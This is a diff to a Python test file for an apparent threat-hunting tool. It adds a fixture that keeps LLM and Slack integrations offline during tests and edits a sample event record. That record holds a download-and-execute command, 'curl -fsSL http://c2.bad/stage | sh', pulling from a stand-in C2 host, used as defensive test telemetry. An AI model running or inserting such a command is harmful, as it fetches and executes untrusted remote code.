@@ -5,6 +5,7 @@ from __future__ import annotations
 from pathlib import Path
 from unittest.mock import MagicMock
 
+import pytest
 from typer.testing import CliRunner
 
 from hecate_runner import cli
@@ -21,6 +22,19 @@ from hecate_runner.lifecycle import get_hunt_lifecycle
 from hecate_runner.query_execution import MockQueryProvider, QueryResult
 from hecate_runner.rule_tuner import RuleTuner
 from hecate_runner.slack_sim import SlackBotSimulator
+
+
+@pytest.fixture(autouse=True)
+def _offline_integrations(monkeypatch):
+    def unavailable():
+        raise RuntimeError("offline in unit tests")
+
+    monkeypatch.setattr("hecate_agent.core.llm_router.create_router", unavailable)
+    monkeypatch.setattr(
+        "hecate_runner.notifications.SlackNotificationRouter.post_message",
+        lambda *args, **kwargs: None,
+    )
+
 
 SAMPLE_HUNT_MARKDOWN = """---
 id: H-0021
@@ -269,7 +283,7 @@ def test_scheduler_closed_loop_pivot_execution(tmp_path: Path) -> None:
                 "user": "nodered",
                 "process": "/bin/sh",
                 "parent": "node-red",
-                "command": "curl -s http://c2.bad/stage | sh",
+                "CommandLine": "curl -fsSL http://c2.bad/stage | sh",
                 "dest_ip": "203.0.113.5",
             }
         ],
